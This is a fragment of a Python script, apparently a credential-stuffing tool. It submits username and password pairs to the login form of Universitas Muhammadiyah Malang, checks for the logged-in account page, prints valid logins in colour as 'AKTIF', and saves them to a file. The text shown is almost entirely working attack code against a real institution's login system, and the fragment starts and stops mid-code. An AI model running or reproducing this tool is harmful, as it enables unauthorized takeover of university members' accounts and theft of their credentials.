...
def unair(i, usr, pwd):
	...
	dat = { 'username':usr, 'password':pwd, 'execution': tok[2]['value'], '_eventId':'log in', 'submit':'login'}
	post = bs(ses.post(url, data=dat).text, 'html.parser').text
	if "My Akun | Universitas Muhammadiyah Malang" in post:
		print(f"{off}{bold}{white}[{green}AKTIF{off}{bold}{white}]{bold}{white}-> {bold}{green}{usr}{bold}{white}:{bold}{green}{pwd}{off}")
		found.append(f"{usr}")
		with open('aktif_umm.txt', 'a') as save:
